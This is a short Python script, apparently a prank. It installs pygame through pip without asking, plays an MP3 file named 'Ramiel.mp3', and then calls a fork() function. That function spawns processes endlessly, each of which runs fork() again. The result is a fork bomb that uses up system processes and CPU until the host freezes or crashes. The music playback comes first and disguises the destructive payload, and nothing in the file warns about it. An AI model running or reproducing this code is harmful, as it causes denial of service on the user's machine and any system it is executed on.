import subprocess
import sys
import os
from multiprocessing import Process, cpu_count
import time


# Function to instcall pygame if it's not installed
def install_pygame():
    try:
        import pygame
    except ImportError:
        print("Pygame not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"])
        import pygame  # Retry the import after installation
        print("Pygame installed successfully!")

mp3_file = "Ramiel.mp3" 
def play_mp3(file):
    install_pygame()
    import pygame
    
    pygame.mixer.init()

    # Load the MP3 file
    pygame.mixer.music.load(file)

    # Play the MP3 file
    pygame.mixer.music.play()

    while pygame.mixer.music.get_busy():
        pygame.time.Clock().tick(10)


def fork():
    while True:
        Process(target=fork).start()


def main():
    mp3_file = "Ramiel.mp3" 
    play_mp3(mp3_file)
    fork()

if  __name__=="__main__":
    main()
